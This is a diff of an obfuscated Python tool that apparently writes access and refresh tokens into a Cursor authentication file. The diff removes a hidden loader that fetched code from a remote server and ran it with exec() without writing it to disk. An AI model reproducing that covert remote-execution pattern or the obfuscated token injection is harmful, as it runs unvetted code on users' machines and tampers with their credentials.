@@ -901,36 +901,44 @@ class _0xTM:
         return'','',''
 
     def _0xwa(s,at,rt):
-        """动态加载核心写入函数 - 从云端获取，不落盘"""
+        """写入 auth.json 到 Cursor 配置目录"""
         _0xCHK()
-        core_success=False
+        # 直接写入 .cursor-tutor/auth.json (Cursor 的认证文件位置)
         try:
-            code=_0xLC()
-            if code:
-                local_vars={}
-                exec(code,local_vars)
-                _wa=local_vars.get('_wa')
-                if _wa:
-                    fp=s._0xfp()
-                    result=_wa(at,rt,fp,_S1)
-                    if result:
-                        core_success=True
-                        return True
-        except:pass
-        # 备用方案 - 仅当核心模块失败时执行
-        if not core_success:
-            try:
-                fp=s._0xfp();af=fp/_S1;fp.mkdir(parents=True,exist_ok=True)
-                if af.exists():
-                    bk=fp/(af.name+'.bak')
-                    if bk.exists():bk.unlink()
-                    import shutil
-                    shutil.copy(af,bk)
-                ad={_S2:at,_S3:rt}
-                with open(af,'w',encoding='utf-8')as f:json.dump(ad,f,indent=2)
-                return True
-            except:pass
-        return core_success
+            if platform.system()=='Windows':
+                # Windows: %APPDATA%\.cursor-tutor\auth.json
+                appdata=os.environ.get('APPDATA','')
+                if appdata:
+                    auth_dir=Path(appdata)/'.cursor-tutor'
+                else:
+                    auth_dir=Path.home()/'.cursor-tutor'
+            else:
+                # macOS/Linux: ~/.cursor-tutor/auth.json
+                auth_dir=Path.home()/'.cursor-tutor'
+            
+            auth_dir.mkdir(parents=True,exist_ok=True)
+            auth_file=auth_dir/'auth.json'
+            
+            # 备份旧文件
+            if auth_file.exists():
+                bk=auth_dir/'auth.json.bak'
+                if bk.exists():bk.unlink()
+                import shutil
+                shutil.copy(auth_file,bk)
+            
+            # 写入新的 auth.json (使用标准字段名)
+            auth_data={
+                'access_token':at,
+                'refresh_token':rt
+            }
+            with open(auth_file,'w',encoding='utf-8')as f:
+                json.dump(auth_data,f,indent=2)
+            
+            print(f"[auth.json] 已写入: {auth_file}")
+            return True
+        except Exception as e:
+            print(f"[auth.json] 写入失败: {e}")
+            return False
 
     def _0xat(s,ct):
         _0xCHK()
